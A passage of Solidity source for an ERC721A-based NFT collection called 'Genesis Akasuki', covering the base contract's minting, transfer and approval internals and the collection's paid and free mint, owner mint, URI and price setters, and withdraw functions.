1090         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1091 
1092         // Overflows are incredibly unrealistic.
1093         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1094         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1095         unchecked {
1096             _addressData[to].balance += uint128(quantity);
1097             _addressData[to].numberMinted += uint128(quantity);
1098 
1099             _ownerships[startTokenId].addr = to;
1100             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1101 
1102             uint256 updatedIndex = startTokenId;
1103 
1104             for (uint256 i; i < quantity; i++) {
1105                 emit Transfer(address(0), to, updatedIndex);
1106                 if (safe) {
1107                     require(
1108                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1109                         "ERC721A: transfer to non ERC721Receiver implementer"
1110                     );
1111                 }
1112 
1113                 updatedIndex++;
1114             }
1115 
1116             currentIndex = updatedIndex;
1117         }
1118 
1119         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1120     }
1121 
1122     /**
1123      * @dev Transfers `tokenId` from `from` to `to`.
1124      *
1125      * Requirements:
1126      *
1127      * - `to` cannot be the zero address.
1128      * - `tokenId` token must be owned by `from`.
1129      *
1130      * Emits a {Transfer} event.
1131      */
1132     function _transfer(
1133         address from,
1134         address to,
1135         uint256 tokenId
1136     ) private {
1137         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1138 
1139         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1140             getApproved(tokenId) == _msgSender() ||
1141             isApprovedForAll(prevOwnership.addr, _msgSender()));
1142 
1143         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1144 
1145         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1146         require(to != address(0), "ERC721A: transfer to the zero address");
1147 
1148         _beforeTokenTransfers(from, to, tokenId, 1);
1149 
1150         // Clear approvals from the previous owner
1151         _approve(address(0), tokenId, prevOwnership.addr);
1152 
1153         // Underflow of the sender's balance is impossible because we check for
1154         // ownership above and the recipient's balance can't realistically overflow.
1155         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1156         unchecked {
1157             _addressData[from].balance -= 1;
1158             _addressData[to].balance += 1;
1159 
1160             _ownerships[tokenId].addr = to;
1161             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1162 
1163             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1164             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1165             uint256 nextTokenId = tokenId + 1;
1166             if (_ownerships[nextTokenId].addr == address(0)) {
1167                 if (_exists(nextTokenId)) {
1168                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1169                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1170                 }
1171             }
1172         }
1173 
1174         emit Transfer(from, to, tokenId);
1175         _afterTokenTransfers(from, to, tokenId, 1);
1176     }
1177 
1178     /**
1179      * @dev Approve `to` to operate on `tokenId`
1180      *
1181      * Emits a {Approval} event.
1182      */
1183     function _approve(
1184         address to,
1185         uint256 tokenId,
1186         address owner
1187     ) private {
1188         _tokenApprovals[tokenId] = to;
1189         emit Approval(owner, to, tokenId);
1190     }
1191 
1192     /**
1193      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1194      * The call is not executed if the target address is not a contract.
1195      *
1196      * @param from address representing the previous owner of the given token ID
1197      * @param to target address that will receive the tokens
1198      * @param tokenId uint256 ID of the token to be transferred
1199      * @param _data bytes optional data to send along with the call
1200      * @return bool whether the call correctly returned the expected magic value
1201      */
1202     function _checkOnERC721Received(
1203         address from,
1204         address to,
1205         uint256 tokenId,
1206         bytes memory _data
1207     ) private returns (bool) {
1208         if (to.isContract()) {
1209             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1210                 return retval == IERC721Receiver(to).onERC721Received.selector;
1211             } catch (bytes memory reason) {
1212                 if (reason.length == 0) {
1213                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1214                 } else {
1215                     assembly {
1216                         revert(add(32, reason), mload(reason))
1217                     }
1218                 }
1219             }
1220         } else {
1221             return true;
1222         }
1223     }
1224 
1225     /**
1226      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1227      *
1228      * startTokenId - the first token id to be transferred
1229      * quantity - the amount to be transferred
1230      *
1231      * Calling conditions:
1232      *
1233      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1234      * transferred to `to`.
1235      * - When `from` is zero, `tokenId` will be minted for `to`.
1236      */
1237     function _beforeTokenTransfers(
1238         address from,
1239         address to,
1240         uint256 startTokenId,
1241         uint256 quantity
1242     ) internal virtual {}
1243 
1244     /**
1245      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1246      * minting.
1247      *
1248      * startTokenId - the first token id to be transferred
1249      * quantity - the amount to be transferred
1250      *
1251      * Calling conditions:
1252      *
1253      * - when `from` and `to` are both non-zero.
1254      * - `from` and `to` are never both zero.
1255      */
1256     function _afterTokenTransfers(
1257         address from,
1258         address to,
1259         uint256 startTokenId,
1260         uint256 quantity
1261     ) internal virtual {}
1262 }
1263 
1264 contract GenesisAkasuki  is ERC721A, Ownable, ReentrancyGuard {
1265     string public baseURI = "https://gateway.pinata.cloud/ipfs/QmZBQGBcyxLW4sG2Z9vUTEBdsgdd2AGU51d3ULSj9fKbF2";
1266     uint   public price             = 0.004 ether;
1267     uint   public maxPerTx          = 20;
1268     uint   public maxPerFree        = 1;
1269     uint   public totalFree         = 7777;
1270     uint   public maxSupply         = 7777;
1271 
1272     mapping(address => uint256) private _mintedFreeAmount;
1273 
1274     constructor() ERC721A("Genesis Akasuki", "AKASUKI"){}
1275 
1276 
1277     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1278         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1279         string memory currentBaseURI = _baseURI();
1280         return bytes(currentBaseURI).length > 0
1281             ? string(abi.encodePacked(currentBaseURI))
1282             : "";
1283     }
1284 
1285     function mint(uint256 count) external payable {
1286         uint256 cost = price;
1287         bool isFree = ((totalSupply() + count < totalFree + 1) &&
1288             (_mintedFreeAmount[msg.sender] + count <= maxPerFree));
1289 
1290         if (isFree) {
1291             cost = 0;
1292             _mintedFreeAmount[msg.sender] += count;
1293         }
1294 
1295         require(msg.value >= count * cost, "Please send the exact amount.");
1296         require(totalSupply() + count <= maxSupply, "No more");
1297         require(count <= maxPerTx, "Max per TX reached.");
1298 
1299         _safeMint(msg.sender, count);
1300     }
1301 
1302     function ownermint(address mintAddress, uint256 count) public onlyOwner {
1303         _safeMint(mintAddress, count);
1304     }
1305 
1306 
1307 
1308     function _baseURI() internal view virtual override returns (string memory) {
1309         return baseURI;
1310     }
1311 
1312     function setBaseUri(string memory baseuri_) public onlyOwner {
1313         baseURI = baseuri_;
1314     }
1315 
1316     function setPrice(uint256 price_) external onlyOwner {
1317         price = price_;
1318     }
1319 
1320     function withdraw() external onlyOwner nonReentrant {
1321         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1322         require(success, "Transfer failed.");
1323     }
1324 }